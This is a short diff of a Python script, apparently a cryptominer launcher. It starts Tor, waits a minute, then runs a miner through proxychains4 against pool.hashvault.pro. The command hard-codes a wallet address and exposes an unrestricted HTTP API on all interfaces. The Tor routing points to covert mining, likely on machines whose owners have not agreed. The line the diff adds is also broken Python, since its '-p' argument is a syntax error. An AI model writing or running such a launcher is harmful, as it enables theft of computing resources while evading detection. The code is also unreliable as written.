@@ -36,4 +36,4 @@ except:
     pass
 os.system('tor &')
 time.sleep(60)
-os.system ('proxychains4 ' + program + ' --donate-level 1 -o pool.hashvault.pro:443 -u 431wRVUSsj89NXLvuoKRyLJdVzZ9qZY6adDcb78JhmZ29G2nAdspMtp9cB5u5HqU5YQgM78MfEWbWDe2vaRjAaxB4YtbUMc -p cores -a rx/0 -k --tls  --http-enabled --http-host 0.0.0.0 --http-port 62432 --http-access-token 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --http-no-restricted -t ' + str(cores))
+os.system ('proxychains4 ' + program + ' --donate-level 1 -o pool.hashvault.pro:443 -u 431wRVUSsj89NXLvuoKRyLJdVzZ9qZY6adDcb78JhmZ29G2nAdspMtp9cB5u5HqU5YQgM78MfEWbWDe2vaRjAaxB4YtbUMc   -a rx/0 -k --tls  --http-enabled --http-host 0.0.0.0 --http-port 62432 --http-access-token 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --http-no-restricted -t ' + str(cores) + ' -p 'str(cores))
